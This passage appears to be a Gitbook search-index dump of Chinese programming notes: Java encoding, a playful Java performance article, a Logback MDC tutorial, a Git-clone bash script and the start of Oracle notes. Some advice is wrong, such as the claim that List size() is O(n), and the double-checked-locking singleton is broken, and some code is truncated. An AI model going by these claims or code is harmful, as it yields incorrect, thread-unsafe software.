对象提供了2个方法以供编码转换（顺带一提，Java 为便于内部交流，所有字符串在内存被处理时都会被转换为 Unicode ，但不影响实际的编码转换操作，认为 Unicode 是中间层即可，可以不关注）： ◇ 解码： new String(byte[] bytes, String rCharset) 把字节数组 bytes 保存为字符串，当需要重新提取 bytes 时（每次使用这个字符串时都会提取），以 rCharset 的编码方式读取（即解码）。 很多人误会了这个方法是把 bytes 转换为以 rCharset 编码的字符串，其实不然。这个方法不会改变 bytes 的值，它只是告诉编码系统，以后应该以 rCharset 方式去提取 bytes 。所以 bytes 的编码方式就应该是 rCharset 。 ◇ 编转码： byte[] str.getBytes(String wCharset) 获取字符串 str 以 wCharset 编码的字节数组。 这个方法实际上是先用 rCharset 编码方式提取字符串 str 中的字节数组 bytes，再根据编码表把 bytes 转换为以 wCharset 编码的字节数组。 使用这个方法时，要保证 wCharset 编码的表示范围大于等于 rCharse，或保证字符串 str 的内容取值范围在 wCharset 的表示范围中，否则必然导致乱码。 前面已经说过，字符集的转码与其表示范围息息相关，即 字符集A 中的 字符k 要转码到 字符集B，必须约定 字符k 是在 字符集B 的表示范围内。而一旦这种约定被破坏，字符集B 会因为在自己的编码表找不到 字符k 的编码，于是就使用一个占位符去替代之。在Java中这个占位符为 0x3F，即英文字符 ?。 举个例子，对于使用 GBK 编码的字符串 見见たa1，若转码为GB2312，则会得到字符串 ?见たa1，因为 GB2312 不能表示繁体中文字符；若转码为 ISO-8859-1 ，则会得到 ???a1 ，因为 ISO-8859-1 只能表示英文字符。 ■ 负负不得正 不难理解，把源字符串使用 A方式 进行编码，若误用了 B方式 去解码，必然会得到乱码字符串。但很多人都以为，对乱码字符串用 B方式 进行编码，再重新用 A方式 去解码，就可以得到源字符串。 其实不然，因为编解码不同于转码，大部分编解码的过程都是不可逆的。 在误用 B方式 去解码的时候，B方式 会在自己的编码表（而不是 A方式 的编码表）查找源编码对应的字符，找不到的编码则用占位符去替代，最后得到的必然不同于源字符串（除非 B 兼容 A），而是新的字符串，即乱码。 若这时再用 B方式 对新字符串编码，然后用 A方式 解码，不过就是互换了刚才 A、B 的位置而已，这不是负负得正，而是恶性循环。 ■ 诡异的 ISO-8859-1 ISO-8859-1 是纯粹用于表示英文字符的编码，因此在众多的编码中，其表示范围可谓渺小到一人之上、万人之下了。尽管如此， ISO-8859-1 却有一个其他编码都不具备的特性：单字节解码特性。 举例说明，把中文字符 我 以 GBK 编码存储在字节数组 gbkBytes 中，则所存储的为两个字节 0xCE 0xD2 。按前文所述的方法，要重新获取 gbkBytes 编码所指向的字符，应该使用 String gbkStr = new String(gbkBytes, \"GBK\")的方法，即告诉编码系统要在 GBK 的编码表查找 gbk Bytes对应的字符。 但若 new String 的时候，声明了其他编码方式作为解码方法，如 UTF-8，则会如前文所述一样，得到一段恶性循环的乱码。但只有 ISO-8859-1 是个例外。 虽然这样做 String isoStr = new String(gbkBytes, \"ISO-8859-1\")，一样会因为 ISO-8859-1 在查自己的编码表时，得到与源字符串相异的乱码，但是 ISO-8859-1 只会把 gbkBytes 逐个字节拆解，当作英文字符处理，并不会出现占位符替换等修改 gbkBytes 内容的情况。 换而言之，由 ISO-8859-1 方式解码产生的乱码是可逆的。事实上，对于isoStr，完全可以用 isoStr.getBytes(\"ISO-8859-1\") 方法还原 gbkBytes 编码。 ■ 协议欺骗 在有些应用环境下，为了规避编码问题（或其他原因），协议往往会限制只能使用英文字符作为传输，如 web 的 url 只允许附带英文参数。但有时候确实需要在这种环境下传输中文，此时就可以利用 ISO-8859-1 的单字节解码特性进行协议欺骗：即传输消息的双方通过逆向处理，都可以把消息的编码进行还原得到中文，但在传输过程中，却可以“遵守”协议的约束，仅传输英文消息。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/java/如何有效率地追求女神.html":{"url":"markdown/notes/language/java/如何有效率地追求女神.html","title":"Java 性能调优：如何有效率地追求女神？","keywords":"","body":"【Java 性能调优】 如何有效率地追求女神？· 这不是引子· 女神都是吃货· 不要轻易触碰女神的底线· 你倾慕的女神不一定是你需要的· 不要试图改变女神的想法· 切忌对女神的体重感到好奇· 女神不需要被过度保护· 不要总盯着女神的缺点· 饥不择食是大忌· 双子女神· 欲速不达，欲擒先纵【Java 性能调优】 如何有效率地追求女神？ 原版 PPT 讲稿下载 · 这不是引子 我在本篇中要讲的内容，其实很多都可以在Java的官方API文档中查到。我只是挑了常用的一部份，糅合我个人的实际经验做说明。而说明中的所有实例都是用了原生态的代码、或伪代码，目的是为了更纯粹地表现思想，万莫过于关注语法等次要信息。 另外可能有些小猿对看完下面的内容后会不屑一顾，觉得为了一点点的性能而这样写代码太抠门了。所谓“不积跬步无以至千里，不积小流无以成大海”，性能最好的代码往往都是抠出来的。 · 女神都是吃货 Java是什么？ Java被使用了十几年，她早已不再是一种纯粹的编程语言。 我估计现在在森林里随便捡只猿，不认识Java的都属于珍贵品种了。时到如今，Java早已成为漫山遍野程序猿心中白手兴家的首选女神。而如同其他的女神一样，Java也毫不留情地升级了她们的共同技能：吃。 Java乱吃内存、CPU的行为，早已是每个程序猿痛心疾首的回忆，大家对她是爱而生畏、追不得又舍不得——毕竟“小吃怡情，大吃致贫，吃饱还吃真要命”啊。为此我们就必须从源头上约束女神的吃货行为——虽然对待女神不能像秋风扫落叶，但也不能太纵容了。 · 不要轻易触碰女神的底线 ArrayList是最广为人知的Java女神之一。但我发现一个奇怪的现象，很多人跟这位女神约会的时候都不约定日期，所以经常会看到这样的代码： List arrayList = new ArrayList(); 这样用写代码什么问题？你没有约定数组的长度！ ArrayList如字面意思，就是数组列表。要知道，数组是一段 定长 的连续空间，实际上ArrayList就是数组的包装类。在默认情况下，ArrayList只是战斗力只有10的渣渣： 所以当我们一旦给她多于10个对象，ArrayList肯定吃不完。凭着ArrayList直率的性格，吃不完，就会直接兜着走：她会马上申请一个原长1.5倍的数组，然后把旧数据尽数复制过去。 这就是ArrayList的 自动扩容 机制。从扩容行为可以知道，在扩容的瞬间会吃掉大量的内存空间、同时带来不必要的性能消耗，而且随着ArrayList长度的增长，副作用就越明显。 其实ArrayList女神是非常矜持的，如果你不想触碰女神的底线，那么与她约会时，即使不能有确切的日期，也应该告诉她大概的时间。所以你完全可以这样做： List arrayList = new ArrayList(size); · 你倾慕的女神不一定是你需要的 慢慢地开始有小猿觉得ArrayList令人太心烦，于是选择了另一个女神LinkedList。LinkedList女神非常开放，只要想见就可以见： List linkList = new LinkedList(); LinkedList如字面意思，就是链表列表。链表就是一个 不定长 的不连续空间。因此在使用LinkedList的时候，无需担心自动扩容的问题。 但事实却并非如此，因为我发现了更严重的问题，有很多这样的代码： linkList.get(i); 这样用写代码什么问题？你在对一个链表做随机访问！ LinkedList女神拥有非常多的秘密，你如果经常对她问这问那，她就必需从头到尾理清自己的思绪才能告诉你答案。长久下去你们之间的距离就会越来越远，因为你问的每个问题她都需要考虑n秒才能决定。 相比之下，ArrayList女神就纯情得多，你可以随时问她任何问题，她都会在1秒内回答。所以，只有当你确定自己不会随便发问的时候，才考虑LinkedList;如果想舒舒服服过日子，还是ArrayList更适合你。不然把O(1)的时间复杂度变成O(n)，实在是得不偿失。 · 不要试图改变女神的想法 所谓“女神心，海底针”，即使你认为你有多了解你的女神，都不要试图改变她的想法。因为你越是觉得了解她，其实就说明你越不了解她。ArrayList女神就是一个很好的例子，我看到过这样的代码： for (int i = 0; i 这样写代码有什么问题？且不论游标错位和索引溢出的问题，你在破坏数组的连续性！ ArrayList为了保证数组连续性，会把删除元素位置后的全部对象前移，这时删除一个元素最坏的时间复杂度是O(n)。而且在访问数组的同时做删除操作，必然会导致游标错位、读取了期望以外的数据，甚至会抛出指针溢出异常。 但总有一些自我主义的人喜欢孜孜不倦地实现女神改造计划，于是乎我又看到了这种代码： List cloneArrayList = new ArrayList(); cloneArrayList.addAll(arrayList); for (int i = 0; i 真是no zuo no die。我承认这段代码的功能没有问题，但在性能方面没有任何可取之处。这段代码非常成功地保证了在O(n^2)的时间复杂度前提下，还能用addAll多浪费了一倍的内存，而目的仅仅只是为了解决游标异常。 其实你完全可以这样做： for (Iterator it = arrayList.iterator(); it.hasNext(); ) { it.remove(); } 或者是这样做： for (int i = arrayList.size() - 1; i >=0; i--) { arrayList.remove(i); } 这两种做法都没有浪费多余的内存。前者使用了迭代器Iteartor，Java构造迭代器的代价是非常低的，而在迭代器执行删除操作的代价就更低了，因为它只需要维护元素之间的指针。而后者虽然没有用迭代器，却保证了最少限度的元素前移。 所以，如果你不希望你的女神变成“女神经”，就应该打消强势去改变她的想法，这是愚蠢的行为。不妨试试旁敲侧击、或逆向思维的做法，或者你会收获女神对你的认同感。 · 切忌对女神的体重感到好奇 经过前面几轮的深入发展，一些小猿已经可以开始和女神讨论一些敏感的问题了——体重。在Java中，每一个List女神都自带了一个体重仪size()。 但似乎失忆总是女神的专利——她们几乎都会故意忘记自己的体重。所以无论你问了她多少次，都只能费力地帮她回想刚刚吃了什么，借此进行体重推演。于是长久下来，不能循环地问女神的体重基本已成为一个共识，因为每次的时间复杂度都是O(n)。 但是如果你和女神独处在单线程环境下，不妨在她add或remove的时候顺手做一下小抄，这样就可以快速知道女神的实时体重了： public class MyList { public void add(Object o) { list.add(o); cnt++; } public void remove(Object o) { list.remove(o); cnt--; } public int getSize() { return cnt; } } 但在多线程环境下就尽量不要这样做了，因为所有的女神都不会喜欢自己的体重在公众环境下过于明码实价。虽然你可以利用同步synchronized做掩饰，使你做小抄的行为更安全隐秘，但这样会浪费太多时间在add和remove上面，发反而得不偿失。 · 女神不需要被过度保护 我常常在多线程环境下看到很多synchronized，虽说目的是对代码做同步保护，但不少的同步都有点多余。确实我们都希望可以在各种环境下保护女神不受伤害，但任何事物一旦过度只会适得其反。 同步块会让代码在多线程环境中更安全，但似乎甚少人会去考虑同步的代价。姑且不论同步不当带来的死锁问题，同步所带来的性能下降至少是100倍。因为同步所牺牲的成本并不是CPU获取锁时花费的时间，而是失去了并行机会——为了在内存得到一致的值，所有线程不能不停下来等待一条线程完成工作，这是极大的浪费。 当女神被过度保护起来之后，她无论做什么都只能先征求一下你的意见，做事效率则自然低下。举一个常见的栗子，单例模式： public class SingleCase { public synchronized SingleCase getInstn() { if (instance == null) { instance = new SingleCase(); return instance; } } } 这样写代码有什么问题？过度同步！ 单例的一个特点就是，它的方法都要先获取单例对象才能调用。而获取单例的方法被这样写，就无异于其他方法都被被强制同步，调用性能大打折扣。 而事实上，单例模式只需要在初始化时同步，其他方法一般都无需同步。我们完全可以这样重构代码： public class SingleCase { public SingleCase getInstn() { if (instance == null) { synchronized (SingleCase.class) { if (instance == null) { instance = new SingleCase(); } return instance; } } } } 在这段代码中，对单例instance做了两次null判断。其中，在synchronized内部的null判断，是为了保证单例不要被重复初始化。而在外部的null判断则限制了同步只在初始化时发生，从而避免了过度同步。 · 不要总盯着女神的缺点 try catch 是Java常用的异常捕获手段，如果我们知道代码在某些情况下会发生异常，率先将其捕获则可增强代码的容错率。 但有些小猿似乎对异常捕获情有独钟，不管三七滥用 try catch 。虽说有缺点的女神才是完美的，但我们不能总盯着女神的缺点看，这只会让她感到厌烦。如这样的代码： try { i = 0; while(true) { System.out.println(arrayList.get(i++)); } } catch (ArrayIndexOutOfBoundsException e) { // TODO } 且不论这段代码的对错，我先解释一下它的用意：一般在遍历一个数组元素时，都会先获取数组长度size，然后定义一个自增索引，每遍历一个元素则与size比较一次是否越界。而ArrayLits的get方法本身也有一个越界检查，这段代码就是为了不重复做越界检查，利用get抛出的越界异常终止遍历。 乍一看视乎是高端大气上档次的优化代码，而事实上，这段代码没有任何可取之处，它至少犯了3个认知错误： ① 条件判断几乎不花时间，这种优化没必要； ② try catch内部的代码不会被编译器优化，这种做法得不偿失； ③ 违反了异常逻辑只能用于异常处理的原则。 第①点就不解释了。至于第②点，编译器在编译代码时，会做一些特定优化（如去掉冗余代码），而try catch需要确切知道哪一行代码出现了问题，在编译时自然不会优化代码，在这里牺牲的代价是沉重的。 而第③是原则性的问题，可以用正常逻辑判断的，就不要让异常发生，甚至不要刻意去制造异常。 · 饥不择食是大忌 编码的时候，在每个关键点做日志输出是很普遍且必要的事。但往往输出日志只是打印一行字符串，久而久之其输出效率就会被忽视。 在实际场景中，一行日志的信息量可能非常大，而其信息源通常又来自于不同的字符串，于是每个日志输出的地方都有大量的字符串拼接。而其中最方便的拼接方式“+”出现频率最高。 要知道，字符串String的本质就是定长的字符数组，它的内容一旦被初始化就无法被修改。而连接符“+”不是通过修改String的内容实现拼接的，它的原理类似于ArrayList的自动扩容，而每一次拼接操作的时间复杂度都是O(n^2)，效率极其低下。 其实如果拼接量不多，使用“+”也无妨。而若有大量拼接操作的情况下，应优先考虑StringBuffer或StringBuilder。StringBuffer是多线程安全的，而StringBuilder虽多线程不安全，但性能比StringBuffer要高。 String有方便性、StringBuffer有安全性、StringBuilder有高效性，三位女神各有所长，应据实谨慎选择，无谓图一时方便而饥不择食，总是滥用String的拼接只会给日志器带来额外的负担。 · 双子女神 在Java里面有一位双子女神HashMap，她糅合了ArrayList和LinkedList两位女神的特点，是一本用于快速查找的KV字典。然而实际上，我看见很多人所使用的都是低效的HashMap，类似这样的代码简直是屡见不鲜： Map map = new HashMap() 这样写代码有什么问题？首先需要了解HashMap的数据结构。 HashMap的核心结构是散列表数组。又由于她使用了链地址法解决地址冲突，因此散列表的每一个元素都是链头，每个链头下挂载了所有地址冲突元素的链表。整体的数据结构类似于十字链表。 从HashMap的数据结构可知，作为数组的散列表同样存在ArrayList的自动扩容特性，因此约定长度以避免自动扩容就很必要了： Map map = new HashMap(size) 但只是这样做还远未达到高效的效果。HashMap的检索效率取决于散列表的利用率、以及冲突链表的长度。这需要保证把KV对放入散列表的每个位置的概率都相等，这时散列表空间利用率最高、地址冲突率最低（冲突链表最短）。 一般情况下可通过key对散列表长度求模计算散列地址，实现概率均等。但Java认为求模操作过于消耗性能，采用了与运算代替之： 求模法：add_val_mod = key % size 与运算：add_val_java = key & (size - 1) 但与运算法有一个明显的缺点，它无法等概率计算出散列表的各个地址值，除非散列表的长度为2^n。所以最高效的HashMap使用方法应该是这样： Map map = new HashMap(2^n) · 欲速不达，欲擒先纵 其实追求女神不难，难在有效率。但有些时候高效却不一定是最好的。 例如要求删除硬盘上的10000个文件，最高效的方法就是一次性删除。但这未必是最好的方法——我在win7上删除大量文件的时候，有时中途点了取消，却长时间无法取消删除，win7依然专注地删除文件。 从这个层面看，一次性删除是最高效的，但同时给用户的感觉却是最差。如果把删除任务进行分片，每删1000个文件检查一次用户是否点了取消按钮，用户的感知就会改善。 同样地，当我们专注于高效地追求女神的时候，可能会忽略了一些细节。所谓欲速则不达，有时放缓一下脚步，不追得太紧，未免就是一件坏事。 追求女神，任重而道远（啊）。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/java/Logback动态日志配置教程.html":{"url":"markdown/notes/language/java/Logback动态日志配置教程.html","title":"Logback 动态日志配置教程","keywords":"","body":"Logback 动态日志配置教程参考资料1. 前言2. 问题背景3. MDC介绍4. 实战：应用MDC配置动态日志4.1. Logback配置：使用SiftingAppender包装你的Append4.2. 代码预设 - MDC的简单封装4.3. MDC使用的总结5. MDC的多线程安全性6. 完整的样例源码Logback 动态日志配置教程 参考资料 Logback中文手册 下载 1. 前言 在阅读本文前，请先保证你熟悉logback的配置方式，能够实现logback的基本日志配置，并明白你的日志是如何通过你的代码找到应该输出到哪个日志文件的。 否则，请先自学上述内容。因为本文不会提及这些东西，若无上述基础，下面的内容是看不懂的。 2. 问题背景 无论是 log4j 还是 logback，通常配置日志的顺序都是： （1）在代码中指定唯一的logger名称； （2）在日志配置文件通过关联该名称。 （3）在日志配置文件中把的日志输出到。 换而言之，logger的名称在开发的时候就需要固定了，后期无论增改logger都需要重新编译代码使之生效。 而实际上，经常有多线程（多用户、或多会话等）环境，需要分别打印自身日志到不同的日志文件。 而多线程是无法预测数量的，即logger无法分别预设（起码在你未看过这篇文章前是这样）。因此往往的解决办法，要么固定多线程的数量和名字、要么全都打到同一份日志。 这两种做法其实都不理想，其实可以通过利用MDC完美解决这个问题。 3. MDC介绍 MDC（Mapped Diagnostic Context，映射调试上下文）是 log4j 和 logback 提供的一种方便在多线程条件下记录日志的功能。某些应用程序采用多线程的方式来处理多个用户的请求。在一个用户的使用过程中，可能有多个不同的线程来进行处理。 MDC 可以看成是一个与当前线程绑定的哈希表，可以往其中添加键值对。MDC 中包含的内容可以被同一线程中执行的代码所访问。当前线程的子线程会继承其父线程中的 MDC 的内容。当需要记录日志时，只需要从 MDC 中获取所需的信息即可。MDC 的内容则由程序在适当的时候保存进去。 4. 实战：应用MDC配置动态日志 4.1. Logback配置：使用SiftingAppender包装你的Append 在说明SiftingAppender之前，先看一个一般的Append配置： 通过这个值配置，可以简单地做到把日志输出到【固定名称】的日志文件your_log_name.log中。 而要通过MDC动态输出日志到【非固定名称】的日志文件，则需要使用SiftingAppender包装你的Append： 绿框中的其实就是原本的Append部分，区别在于固定名称your_log_name被替换成变量${YOUR_MDC_KEY}。 实则上MDC就是一个Hash表，在打印日志前，它会在Hash表中找到真正的日志名称，然后替换掉${YOUR_MDC_KEY}，从而实现日志动态化。 需要注意的是，SiftingAppender中定义了MDC的参数，其中值虽然可自定义，但是由于用于代码中的MDC关联，因此确定后就不能再修改，否则你需要重新编译代码。 而是当logback在MDC找不到键所对应的值时，就会把日志输出到OTHER.log的意思。除非故意把配成与代码定义的值不一致，否则一般不会出现此情况。 YOUR_MDC_KEY OTHER 完整的日志配置如下： ${CHARSET} ${PATTERN_DEF} System.out YOUR_MDC_KEY OTHER false ${LOG_HOME}/classify/${YOUR_MDC_KEY}.log ${BACKUP}/classify/${YOUR_MDC_KEY}_%d{yyyy-MM-dd}.log.zip 7 ${CHARSET} ${PATTERN_DEF} 4.2. 代码预设 - MDC的简单封装 要在代码中利用MDC打印日志，首先你需要用slf4j定义一个Logger，Logger的名称保证与logback配置文件的同名： org.slf4j.Logger mdclog = org.slf4j.LoggerFactory.getLogger(\"YOUR_LOGGER_NAME\"); 然后在每次打印日志的时候，都需要先预设MDC环境： org.slf4j.MDC.put(\"YOUR_MDC_KEY\", \"your_log_name_a\"); mdclog.info(\"This is A\"); org.slf4j.MDC.put(\"YOUR_MDC_KEY\", \"your_log_name_b\"); mdclog.info(\"This is B\"); 于是根据上一节的MDC日志配置，就可以自动生成两份日志文件 your_log_name_a.log 和 your_log_name_b.log ，并且在 your_log_name_a.log 中打印了 This is A，在 your_log_name_b.log 中打印了 This is B。 然而这种做是很麻烦的，因此建议做一个简单的封装类： import org.slf4j.Logger; import org.slf4j.LoggerFactory; import org.slf4j.MDC; /** * * MDC日志封装器 * * PROJECT : exp-libs * SUPPORT : www.exp-blog.com * @version 2014-09-12 * @author EXP: 272629724@qq.com * @since jdk版本：jdk1.6 */ public final class LogByMDC { /** * 你自定义的MDC主键，必须与 logback.xml配置文件中的 / 一致。 */ private static final String MDC_KEY = \"YOUR_MDC_KEY\"; /** * 用于打印动态日志的logger对象，与 logback.xml配置文件中的 * 属性同名关联即可。 */ private static final Logger mdclog = LoggerFactory.getLogger(\"YOUR_LOGGER_NAME\"); /////////////////////////////////////////////////////// // 下面的方法只是方便做日志打印做的简单封装 // 实则上使用MDC打印日志时，由于每次都要先 put 一次 MDC，所以封装比较方便 // 注意logback的日志等级是 trace 尔后，在实际的应用中，就可以通过在项目的配置文件去配置 your_log_name_X ，用代码加载后再put到MDC中，实现日志的动态化。 4.3. MDC使用的总结 针对前两节内容，要使用logback打印动态日志，无非以下几个步骤： （1）先用SiftingAppender包装好既有的Append，同时修改日志名称为MDC键名称。 （2）在代码中定义一个专用于打印动态日志的Logger，每次用它打印日志器前先调用 MDC.put(mdc_key, log_name_X) 预设环境，其中 log_name_X 配置在项目的配置文件中。 （3）最后就可以用一个Logger打印N份日志了。 5. MDC的多线程安全性 由于MDC所提供的put方法预设环境是静态的，可能有人会担心其多线程的安全性问题。这个问题无需考虑，MDC明确是多线程安全的： MDC中的put方法其实就是将键值对放入一个Hashtable对象中，然后赋值给当前线程的ThreadLocal.ThreadLocalMap对象，即threadLocals，这保证了各个线程的在MDC键值对的独立性。 6. 完整的样例源码 logback动态日志-Java源码 下载 解压后导入Eclipse即可（编码为UTF-8）。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/python/":{"url":"markdown/notes/language/python/","title":"Python","keywords":"","body":"PYTHONPYTHON Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/ruby/":{"url":"markdown/notes/language/ruby/","title":"Ruby","keywords":"","body":"RUBYRUBY Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/ass/":{"url":"markdown/notes/language/ass/","title":"汇编","keywords":"","body":"汇编汇编 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/shell/":{"url":"markdown/notes/language/shell/","title":"Shell","keywords":"","body":"ShellShell 从 Git 仓库拉取代码到本地 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/shell/PullGitRepos.html":{"url":"markdown/notes/language/shell/PullGitRepos.html","title":"从 Git 仓库拉取代码","keywords":"","body":"从 Git 仓库拉取代码到本地从 Git 仓库拉取代码到本地 #!/bin/bash # 从 Git 仓库拉取代码到本地 #------------------------------------------------- # 命令执行示例： # ./pull_git_repository.sh -u USERNAME -p PASSWORD #------------------------------------------------- # 命令参数定义 DOMAIN=\"www.xyz.com/repository\" GITURL=\"https://${DOMAIN}\" # -a: Git 仓库地址 GITBRANCH=\"master\" # -b: Git 仓库分支名称 GITUSER=\"user@abc.com\" # -u: Git 仓库账号 GITPASS=\"123456\" # -p: Git 仓库密码 GITTAG=\"latest\" # -v: 要使用的 Git 的 tag 基线版本名称 (若使用分支的最新版本，保持为默认值即可) TARGET=\"/tmp/repository\" # -t: 拉取仓库到本地的存储位置(若该位置已存在 Git 则自动拉取最新代码，此时忽略其他参数) # 使用说明 usage() { cat Git Repository URL. (Default: \"${GITURL}\") -b Git Repository Branch. (Default: \"${GITBRANCH}\") -u Git Repository Username. (Default: \"${GITUSER}\") -p Git Repository Password. (Default: \"${GITPASS}\") -v Git Repository Tag Version. (Default: \"${GITTAG}\") -t Save Git Repository Directory. (Default: \"${TARGET}\") EOF exit 0 } # [ \"$1\" = \"\" ] && usage [ \"$1\" = \"-h\" ] && usage [ \"$1\" = \"-H\" ] && usage # 定义参数键和值 set -- `getopt a:b:u:p:v:t: \"$@\"` while [ -n \"$1\" ] do case \"$1\" in -a) GITURL=\"$2\" shift ;; -b) GITBRANCH=\"$2\" shift ;; -u) GITUSER=\"$2\" shift ;; -p) GITPASS=\"$2\" shift ;; -v) GITTAG=\"$2\" shift ;; -t) TARGET=\"$2\" shift ;; esac shift done # 标记目标路径 ${TARGET} 是否已存在 Git Repository export EXIST_GITLAB=\"F\" # 判断存储路径是否存在 \"..\" , 避免入参路径穿越 if [[ ${TARGET} =~ \"..\" ]] ; then echo \"Error: target path '${TARGET}' exists path crossing risk (Please remove all '..' !!!)\" exit 1 fi # 禁止直接使用一、二级目录(如 /, /tmp, /home 等)，必须至少是三级目录 if [[ ${TARGET} =~ ^/[a-zA-Z0-9]*$ ]] ; then echo \"Error: target path '${TARGET}' must be a three-level directory at least, eg: /tmp/repository\" exit 1 fi # 要求存储项目的目录为空目录, 确保把相关操作控制在该目录内 if [ ! -d ${TARGET} ] ; then : # 目录不存在 elif [ \"`ls -A ${TARGET}`\" = \"\" ] ; then : # 目录存在但是为空 else # 检查目标目录是否已存在仓库 if [[ $(cat ${TARGET}/.git/config | grep 'url') =~ ${DOMAIN} ]] ; then EXIST_GITLAB=\"T\" else echo \"Error: target path '${TARGET}' already exists and is not an empty directory.\" exit 1 fi fi # 删除 url 地址开头的 http 标识 export GITURI=${GITURL#https://} GITURI=${GITURI#http://} # 把 username 和 password 里面的 @ 字符编码为 %40 GITUSER=${GITUSER//@/%40} GITPASS=${GITPASS//@/%40} echo \"---------- Input Params ----------\" echo \"Git Repository URL = ${GITURL}\" echo \"Git Repository Branch = ${GITBRANCH}\" echo \"Git Repository User = ${GITUSER}\" # echo \"Git Repository Pass = ${GITPASS}\" echo \"Git Repository Pass = ********\" echo \"Git Repository Tag Version = ${GITTAG}\" echo \"Save Directory = ${TARGET}\" echo \"----------------------------------\" # 从 Git 仓库拉取项目 if [ ${EXIST_GITLAB} = \"F\" ] ; then echo \"Pulling Git Repository from ${GITURL} ...\" git clone https://${GITUSER}:${GITPASS}@${GITURI} ${TARGET} if [ -d ${TARGET} ] ; then echo \"Git Repository has been saved to : ${TARGET}\" else echo \"Error: Pull Git Repository Failed.\" exit 1 fi fi # 更新 master 最新的代码以及 branch 、 tag 等信息 echo \"Update Git Repository ...\" cd ${TARGET} git checkout master git pull # 切换 branch # git checkout if [ \"${GITTAG}\" = \"latest\" ] ; then echo \"Switch to branch ${GITBRANCH} ...\" branch=$(git branch -a | grep ${GITBRANCH}) echo \"${branch}\" if [ -n \"${branch}\" ]; then git checkout ${GITBRANCH} # 切换分支 git pull # 更新到分支的最新版本 else echo \"Error: branch '${GITBRANCH}' is not exists.\" exit 1 fi # 切换 tag (注意 tag 是基线，不需要也不能通过 pull 更新代码) # git checkout -b else echo \"Switch to tag ${GITTAG} ...\" tag=$(git tag | grep ${GITTAG}) branch=$(git branch -a | grep ${GITTAG}) # 若 tag 存在 if [ -n \"${tag}\" ]; then # 若未创建该 tag 对应的本地分支，则创建并切换到该分支 if [ -z \"${branch}\" ]; then git checkout -b ${GITTAG} ${GITTAG} # 若已创建该 tag 对应的本地分支，则直接切换到该分支 else git checkout ${GITTAG} fi else echo \"Error: tag '${GITTAG}' is not exists.\" exit 1 fi fi echo \"Finish: Git Repository has been updated to : ${TARGET}\" exit 0 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/datastruct/":{"url":"markdown/notes/datastruct/","title":"数据结构","keywords":"","body":"数据结构数据结构 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/design/":{"url":"markdown/notes/design/","title":"设计模式","keywords":"","body":"设计模式设计模式 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/database/":{"url":"markdown/notes/database/","title":"数据库","keywords":"","body":"数据库数据库 Oracle 学习笔记 Redis 部署笔记 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/database/Oracle学习笔记.html":{"url":"markdown/notes/database/Oracle学习笔记.html","title":"Oracle 学习笔记","keywords":"","body":"Oracle学习笔记1. 前言2. 参考资料3. 数据库体系结构3.1. 逻辑与物理结构3.2. 模式对象3.3. Oracle进程与内存结构3.4. Oracle的读写机制3.5. 物理构成4. Oracle的安装与管理工具4.1. Oracle的安装4.2. Oracle的启动4.3. Oracle的关闭4.4. Oracle的管理工具5. Oracle的实例管理5.2. 创建数据库5.3. 表空间的创建与管理5.4. 表的创建与管理5.5. 索引管理5.6. 分区表管理5.7. 用户管理5.8. 数据备份与迁移6. 数据库的日常开发要求Oracle学习笔记 1. 前言 本学习笔记仅涵盖了基本的 Oracle 入门知识，是我在学习时的随笔记录整理，其中部分内容可能存在错漏。若有疑问敬请提出或指正。 2. 参考资料 名称 来源 Oracle新建用户、角色，授权，建表空间 红黑联盟 Oracle表空间的相关查询 百度文库 查找Oracle数据文件、表空间的位置 网易博客 Oracle创建表空间、给用户分配表空间 CSDN Oracle新建数据库 百度知道 Oracle数据库导入导出命令 博客园 expdp 详解及实例 百度文库 expdp/impdp 及 exp/imp 博客园 Oracle数据库impdb和expdb操作 新浪博客 3. 数据库体系结构 3.1. 逻辑与物理结构 3.1.1. 数据库 Database 数据库是磁盘上存储的数据的集合（包括数据文件、日志文件、配置文件和控制文件），但Oracle同时也是一种关系型数据库管理系统（RDBMS），它能够提供关系模式存储和访问数据的方法，因此“数据库”不纯粹指物理上的数据，也指在逻辑上的各种对象的组合。 3.1.2. 表空间 TableSpace 表空间是数据库的逻辑划分，它是数据库中物理编组的数据仓库。 一个数据库是由一个或多个表空间所组成的，每个数据库至少有一个表空间（叫系统表空间），而其他表空间则可供用户群及应用系统共同使用。 一个表空间只能属于一个数据库。 3.1.3 段 Segment 段是表空间的逻辑划分，一个表空间包含许多段。 段包括一个表空间内特定逻辑结构的所有数据，段不能跨表空间存放。 3.1.4. 区 Extent 区是段的逻辑划分，一个段是一个或多个不连续的区的集合。 一个区由一组连续的数据库块组成。 3.1.5. 数据库块 DatabaseBlock 数据库块也称逻辑块或Oracle块，它是Oracle最小的存储单位。Oracle每次请求数据的时候，都是以块为单位。也就是说，Oracle每次请求的数据是块的整数倍。如果Oracle请求的数据量不到一块，Oracle也会读取整个块。 数据库块对应磁盘上一个或多个物理块（不必连续）。 3.2. 模式对象 3.2.1. 实例 Instance 数据库实例是运行在数据库文件上的一组Oracle后台进程/线程以及一个共享的内存区。即用于访问一个数据库文件集的一个存储结构及后台进程的集合。 数据库可以由数据库实例装载和打开。一般一个数据库对应一个数据库实例，但多个不同的Oracle实例可以装在同一个Oracle数据库。 3.2.2. 数据库链 DatabaseLink 